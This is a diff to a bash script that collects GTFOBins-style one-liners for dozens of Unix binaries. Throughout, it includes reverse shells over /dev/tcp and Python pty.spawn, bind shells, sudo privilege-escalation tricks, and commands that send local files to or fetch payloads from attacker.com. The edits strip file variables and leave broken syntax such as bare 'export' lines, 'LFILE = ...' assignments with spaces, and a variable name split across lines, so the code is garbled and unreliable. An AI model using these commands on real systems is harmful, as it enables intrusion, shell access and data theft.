@@ -1,19 +1,21 @@
 #!/bin/bash
+touch TestFile.something
+"some data for test " > TestFile.something
+LFILE = TestFile.something
 
-LFILE=file_to_read
 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
-LFILE=file_to_read
+
 sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
 URL=http://attacker.com/
-LFILE=file_to_send
+
 ab -p $LFILE $URL
 URL=http://attacker.com/file_to_download
 ab -v2 $URL
 URL=http://attacker.com/
-LFILE=file_to_send
+
 ./ab -p $LFILE $URL
 URL=http://attacker.com/
-LFILE=file_to_send
+
 sudo ab -p $LFILE $URL
 LFILE=file_to_read
 alpine -F "$LFILE"
@@ -63,7 +65,7 @@ echo "$COMMAND" > $TF
 chmod +x $TF
 aria2c --on-download-error=$TF http://x
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 aria2c -o "$LFILE" "$URL"
 COMMAND='id'
 TF=$(mktemp)
@@ -191,11 +193,11 @@ export RPORT=12345
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
 export RHOST=attacker.com
 export RPORT=12345
@@ -328,7 +330,7 @@ LFILE=file_to_delete
 c99 -xc /dev/null -o $LFILE
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
 LFILE=file_to_read
 cat "$LFILE"
@@ -548,10 +550,10 @@ sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
 LFILE=file_to_read
 ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
 URL=http://attacker.com/
-LFILE=file_to_send
+
 curl -X POST -d "@$LFILE" $URL
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 curl $URL -o $LFILE
 LFILE=/tmp/file_to_read
 curl file://$LFILE
@@ -560,10 +562,10 @@ TF=$(mktemp)
 echo DATA >$TF
 curl "file://$TF" -o "$LFILE"
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 ./curl $URL -o $LFILE
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 sudo curl $URL -o $LFILE
 LFILE=file_to_read
 cut -d "" -f1 "$LFILE"
@@ -657,8 +659,13 @@ TF=$(mktemp)
 docker cp file_to_read $CONTAINER_ID:$TF
 docker cp $CONTAINER_ID:$TF $TF
 cat $TF
-LFILE1=file_to_read
-LFILE2=file_to_write
+
+"someText" > LFILE1.txt 
+LFILE1 = LFILE1.txt
+
+touch LFILE2.txt 
+LFILE2=LFILE2.txt 
+
 dos2unix -f -n "$LFILE1" "$LFILE2"
 LFILE='\path\to\file_to_read'
 dosbox -c 'mount c /' -c "type c:$LFILE"
@@ -711,7 +718,7 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 pty.spawn("/bin/sh")' > $TF/setup.py
 easy_install $TF
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 TF=$(mktemp -d)
 echo 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
@@ -844,10 +851,10 @@ sudo file -f $LFILE
 LFILE=file_to_write
 find / -fprintf "$FILE" DATA -quit
 RHOST=attacker.com
-LFILE=file_to_send
+
 finger "$(base64 $LFILE)@$RHOST"
 RHOST=attacker.com
-LFILE=file_to_save
+
 finger x@$RHOST | base64 -d > "$LFILE"
 LFILE=file_to_read
 fmt -pNON_EXISTING_PREFIX "$LFILE"
@@ -911,7 +918,7 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")' -ex quit
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 gdb -nx -ex 'python import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -922,7 +929,7 @@ if sys.version_info.major == 3: import http.server as s, socketserver as ss
 else: import SimpleHTTPServer as s, SocketServer as ss
 ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 gdb -nx -ex 'python import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
@@ -950,7 +957,7 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -961,7 +968,7 @@ if sys.version_info.major == 3: import http.server as s, socketserver as ss
 else: import SimpleHTTPServer as s, SocketServer as ss
 ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
@@ -1114,7 +1121,7 @@ require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(
 irb
 require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 irb
 require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
 irb
@@ -1142,7 +1149,7 @@ var s=new Socket(host,port);
 var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
 var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 echo "var URL = Java.type('java.net.URL');
 var ws = new URL('$URL');
 var Channels = Java.type('java.nio.channels.Channels');
@@ -1196,7 +1203,7 @@ so.flush();po.flush();
 java.lang.Thread.sleep(50);
 try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 jrunscript -e "cp('$URL','$LFILE')"
 while ((line = br.readLine()) != null) { print(line); }'
 julia -e 'run(`/bin/sh`)'
@@ -1205,7 +1212,7 @@ julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
 export LFILE=file_to_write
 julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 julia -e 'download(ENV["URL"], ENV["LFILE"])'
 export RHOST=attacker.com
 export RPORT=12345
@@ -1219,11 +1226,11 @@ export RPORT=12345
 ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
 export RHOST=attacker.com
 export RPORT=12345
@@ -1314,7 +1321,7 @@ To collect the file run the following on the attacker box (this requires `cups` 
 3. `cupsctl --remote-any` to enable printing from the Internet;
 4. `nc -lkp 9100` to receive the file.
 Send a local file to a CUPS server.
-LFILE=file_to_send
+
 RHOST=attacker.com
 lp $LFILE -h $RHOST
 LFILE=file_to_read
@@ -1341,7 +1348,7 @@ local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 lua -e '
 local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
@@ -1353,7 +1360,7 @@ t:send(d);
 t:close();'
 < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
 export LPORT=12345
-export LFILE=file_to_save
+export 
 lua -e 'local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -1363,10 +1370,10 @@ local f=io.open(os.getenv("LFILE"), "wb");
 f:write(d);
 io.close(f);'
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 lwp-download $URL $LFILE
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 sudo lwp-download $URL $LFILE
 LFILE=file_to_read
 TF=$(mktemp)
@@ -1436,7 +1443,8 @@ TERM= sudo more /etc/profile
 LFILE=file_to_read
 mosquitto -c "$LFILE"
 LFILE=file_to_read
-./mosquitto -c "$LFILE"
+./mosquitto -c "$L
+FILE"
 LFILE=file_to_read
 sudo mosquitto -c "$LFILE"
 sudo mount -o bind /bin/sh /bin/mount
@@ -1541,10 +1549,10 @@ LPORT=12345
 nc -l -p $LPORT -e /bin/sh
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 nc $RHOST $RPORT < "$LFILE"
 LPORT=12345
-LFILE=file_to_save
+
 nc -l -p $LPORT > "$LFILE"
 RHOST=attacker.com
 RPORT=12345
@@ -1619,11 +1627,11 @@ end;c:close();f:close();' > $TF
 nmap --script=$TF
 RHOST=attacker.com
 RPORT=8080
-LFILE=file_to_send
+
 nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 TF=$(mktemp)
 echo 'local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
@@ -1637,10 +1645,10 @@ nmap --script=$TF
 RHOST=attacker.com
 RPORT=8080
 TF=$(mktemp -d)
-LFILE=file_to_save
+
 nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
 export LPORT=12345
-export LFILE=file_to_save
+export 
 TF=$(mktemp)
 echo 'local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
@@ -1672,10 +1680,10 @@ LFILE=file_to_write
 ./nmap -oG=$LFILE DATA
 node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
 export URL=http://attacker.com
-export LFILE=file_to_send
+export 
 node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
 export RHOST=attacker.com
 export RPORT=12345
@@ -1741,7 +1749,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
 Send a local file via TCP. Transmission will be encrypted.
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
 To send the file run the following on the attacker box:
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -1749,7 +1757,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send
 Fetch a file from a TCP port, transmission will be encrypted.
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_save
+
 openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
 LFILE=file_to_write
 echo DATA | openssl enc -out "$LFILE"
@@ -1867,7 +1875,7 @@ LHOST=0.0.0.0
 LPORT=8888
 php -S $LHOST:$LPORT
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
 CMD="/bin/sh"
 ./php -r "pcntl_exec('/bin/sh', ['-p']);"
@@ -1923,7 +1931,7 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 pty.spawn("/bin/sh")' > $TF/setup.py
 pip install $TF
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 TF=$(mktemp -d)
 echo 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
@@ -2010,7 +2018,7 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 python -c 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2021,7 +2029,7 @@ if sys.version_info.major == 3: import http.server as s, socketserver as ss
 else: import SimpleHTTPServer as s, SocketServer as ss
 ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 python -c 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
@@ -2085,7 +2093,7 @@ Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on 
 The file is corrupted by leading and trailing spurious data.
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
 LFILE=file_to_write
 rlwrap -l "$LFILE" echo DATA
@@ -2106,7 +2114,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(
 export LPORT=8888
 ruby -run -e httpd . -p $LPORT
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
 run-mailcap --action=view /etc/hosts
 !/bin/sh
@@ -2148,7 +2156,7 @@ local r,x=c:receive();local f=assert(io.popen(r,"r"));
 local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 rview -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2162,7 +2170,7 @@ ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
 vim.command(":q!")'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 rview -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
 io.close(f);
@@ -2172,14 +2180,14 @@ t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
 t:send(d);
 t:close();'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 rview -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])
 vim.command(":q!")'
 export LPORT=12345
-export LFILE=file_to_save
+export 
 rview -c ':lua local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -2217,7 +2225,7 @@ local r,x=c:receive();local f=assert(io.popen(r,"r"));
 local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 rvim -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2231,7 +2239,7 @@ ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
 vim.command(":q!")'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 rvim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
 io.close(f);
@@ -2241,14 +2249,14 @@ t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
 t:send(d);
 t:close();'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 rvim -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])
 vim.command(":q!")'
 export LPORT=12345
-export LFILE=file_to_save
+export 
 rvim -c ':lua local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -2275,7 +2283,7 @@ RPATH=user@attacker.com:~/file_to_save
 LPATH=file_to_send
 scp $LFILE $RPATH
 RPATH=user@attacker.com:~/file_to_get
-LFILE=file_to_save
+
 scp $RPATH $LFILE
 TF=$(mktemp)
 echo 'sh 0<&2 1>&2' > $TF
@@ -2349,11 +2357,11 @@ LPORT=12345
 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_save
+
 socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
 LFILE=file_to_read
 socat -u "file:$LFILE" -
@@ -2503,7 +2511,7 @@ rm "$TF"*
 RHOST=attacker.com
 RUSER=root
 RFILE=/tmp/file_to_send.tar
-LFILE=file_to_send
+
 tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
 RHOST=attacker.com
 RUSER=root
@@ -2722,7 +2730,7 @@ local r,x=c:receive();local f=assert(io.popen(r,"r"));
 local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 view -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2736,7 +2744,7 @@ ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
 vim.command(":q!")'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
 io.close(f);
@@ -2746,14 +2754,14 @@ t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
 t:send(d);
 t:close();'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 view -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])
 vim.command(":q!")'
 export LPORT=12345
-export LFILE=file_to_save
+export 
 view -c ':lua local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -2791,7 +2799,7 @@ local r,x=c:receive();local f=assert(io.popen(r,"r"));
 local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 vim -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2805,7 +2813,7 @@ ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
 vim.command(":q!")'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
 io.close(f);
@@ -2815,14 +2823,14 @@ t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
 t:send(d);
 t:close();'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 vim -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])
 vim.command(":q!")'
 export LPORT=12345
-export LFILE=file_to_save
+export 
 vim -c ':lua local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -2863,7 +2871,7 @@ local r,x=c:receive();local f=assert(io.popen(r,"r"));
 local b=assert(f:read("*a"));c:send(b);
 end;c:close();f:close();'
 export URL=http://attacker.com/
-export LFILE=file_to_send
+export 
 vimdiff -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -2877,7 +2885,7 @@ ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
 vim.command(":q!")'
 export RHOST=attacker.com
 export RPORT=12345
-export LFILE=file_to_send
+export 
 vimdiff -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
 local d=f:read("*a")
 io.close(f);
@@ -2887,14 +2895,14 @@ t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
 t:send(d);
 t:close();'
 export URL=http://attacker.com/file_to_get
-export LFILE=file_to_save
+export 
 vimdiff -c ':py import vim,sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])
 vim.command(":q!")'
 export LPORT=12345
-export LFILE=file_to_save
+export 
 vimdiff -c ':lua local k=require("socket");
 local s=assert(k.bind("*",os.getenv("LPORT")));
 local c=s:accept();
@@ -2980,7 +2988,7 @@ chmod +x $TF
 echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
 wget --use-askpass=$TF 0
 URL=http://attacker.com/
-LFILE=file_to_send
+
 wget --post-file=$LFILE $URL
 LFILE=file_to_read
 wget -i $LFILE
@@ -2989,7 +2997,7 @@ TF=$(mktemp)
 echo DATA > $TF
 wget -i $TF -o $LFILE
 URL=http://attacker.com/file_to_get
-LFILE=file_to_save
+
 wget $URL -O $LFILE
 TF=$(mktemp)
 chmod +x $TF
@@ -3007,19 +3015,19 @@ LFILE=file_to_read
 sudo whiptail --textbox --scrolltext "$LFILE" 0 0
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 whois -h $RHOST -p $RPORT "`cat $LFILE`"
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_send
+
 whois -h $RHOST -p $RPORT "`base64 $LFILE`"
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_save
+
 whois -h $RHOST -p $RPORT > "$LFILE"
 RHOST=attacker.com
 RPORT=12345
-LFILE=file_to_save
+
 whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
 This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.
 This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.
